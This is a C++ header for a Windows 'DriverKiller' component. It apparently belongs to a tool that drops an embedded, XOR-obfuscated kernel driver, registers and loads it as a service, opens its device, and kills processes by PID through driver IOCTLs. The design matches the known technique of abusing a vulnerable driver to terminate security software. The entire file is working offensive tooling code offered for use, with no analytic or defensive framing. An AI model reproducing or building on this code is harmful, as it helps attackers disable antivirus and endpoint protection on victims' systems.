#pragma once
#include <atomic>
#include <windows.h>
#include "DriverService.hpp"
#include "FileUtils.hpp"
#include "Log.hpp"

template <class _Ty>
concept Killer = requires ()
{
	std::derived_from<_Ty, Singleton<_Ty>>;

	std::declval<decltype(_Ty::Instance())>();

	{
		_Ty::Instance().KillProcess(std::declval<ULONG>())
	} -> std::same_as<BOOLEAN>;
	
};

template<typename T>
struct DriverKiller
{
	BOOLEAN
	Initialize(const unsigned char* FileData,
			   const size_t FileSize,
			   const unsigned char* Service,
			   const size_t ServiceLength,
			   const unsigned char Key) noexcept;

	VOID Uninitialize();

	BOOLEAN
		Kill(ULONG Pid)requires(Killer<T>)
	{
		return static_cast<T*>(this)->KillProcess(Pid);
	}

	HANDLE
		CreateDevice(const char* DeviceName);

	/*
	* Oh.. what a baby, Such a ugly method
	*/
	BOOLEAN
		DeviceIoControl(
			HANDLE	DeviceHandle,
			ULONG	IoControlCode,
			PVOID	InputBuffer,
			ULONG	InputBufferLength,
			PVOID	OutputBuffer,
			ULONG	OutputBufferLength);

	HANDLE			m_hDevice{ INVALID_HANDLE_VALUE };
	DriverService*  m_pDriverService{ nullptr };
	BOOLEAN			m_bInitialized{ FALSE };
};

template<typename T>
BOOLEAN DriverKiller<T>::Initialize(
	const unsigned char* FileData,
	const size_t FileSize,
	const unsigned char* Service,
	const size_t ServiceLength,
	const unsigned char Key) noexcept
{
	if (m_bInitialized)
	{
		return TRUE;
	}

	// Create the driver file from the resource data
	std::string driverFullPath;
	if (!FileUtils::CreateDriverFile(driverFullPath,
									 (const char*)FileData,
									 FileSize,
									 Key))
	{
		LOG("[-] CreateDriverFile failed");
		return FALSE;
	}

	// Register and start the driver service
	// std::string strServiceName{ HwRwSys::service };

	// Get the device name from the resource data
	std::string deviceName = FileUtils::GetServiceName(Service,
													   ServiceLength,
													   Key);
	if (deviceName.empty())
	{
		return FALSE;
	}

	m_pDriverService = new DriverService(driverFullPath, deviceName);
	if (!m_pDriverService)
	{
		LOG("[-] Failed to create DriverService instance");
		return FALSE;
	}

	if (!NT_SUCCESS(m_pDriverService->RegisterService()))
	{
		LOG("[-] Failed to register driver service");
		return FALSE;
	}

	// Load the driver
	if (!NT_SUCCESS(m_pDriverService->LoadDriver()))
	{
		LOG("[-] Failed to load driver");
		return FALSE;
	}

	// Create Device 
	m_hDevice = CreateDevice(deviceName.c_str());
	if (INVALID_HANDLE_VALUE == m_hDevice)
	{
		return FALSE;
	}

	m_bInitialized = TRUE;
	return TRUE;
}

template<typename T>
VOID DriverKiller<T>::Uninitialize()
{
	if (m_pDriverService)
	{
		m_pDriverService->StopAndUnregister();

		delete m_pDriverService;
		m_pDriverService = nullptr;
	}

	if (INVALID_HANDLE_VALUE != m_hDevice)
	{
		CloseHandle(m_hDevice);
		m_hDevice = INVALID_HANDLE_VALUE;
	}

	m_bInitialized = FALSE;
}

template<typename T>
BOOLEAN DriverKiller<T>::DeviceIoControl(
	HANDLE DeviceHandle,
	ULONG IoControlCode,
	PVOID InputBuffer,
	ULONG InputBufferLength,
	PVOID OutputBuffer,
	ULONG OutputBufferLength)
{
	NTSTATUS status{ STATUS_SUCCESS };
	status = Utils::NtDeviceIoControlFile(DeviceHandle,
										  IoControlCode,
										  InputBuffer,
										  InputBufferLength,
										  OutputBuffer,
										  OutputBufferLength);
	if (NT_SUCCESS(status))
	{
		return TRUE;
	}
	return FALSE;
}

template<typename T>
HANDLE DriverKiller<T>::CreateDevice(const char* DeviceName)
{
	HANDLE hDevice{ INVALID_HANDLE_VALUE };

	std::string strDeviceName(DeviceName);
	std::wstring tmpDeviceName(strDeviceName.begin(), strDeviceName.end());

	std::wstring wstrDeviceName = L"\\??\\";
	wstrDeviceName += tmpDeviceName;

	UNICODE_STRING ustrDeviceName{};
	RtlInitUnicodeString(&ustrDeviceName, wstrDeviceName.c_str());

	OBJECT_ATTRIBUTES oa{};
	InitializeObjectAttributes(&oa, &ustrDeviceName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

	IO_STATUS_BLOCK iosb{};
	auto status = Utils::NtCreateFile(&hDevice,
									  FILE_GENERIC_WRITE | FILE_GENERIC_READ,
									  &oa,
									  &iosb,
									  nullptr,
									  FILE_ATTRIBUTE_NORMAL,
									  FILE_SHARE_READ | FILE_SHARE_WRITE,
									  FILE_OPEN,
									  FILE_SYNCHRONOUS_IO_NONALERT,
									  nullptr,
									  0);
	if (!NT_SUCCESS(status))
	{
		LOG("[-] Failed to create device handle. NTSTATUS: 0x" << std::hex << status << std::dec);
		return INVALID_HANDLE_VALUE;
	}

	return hDevice;
}


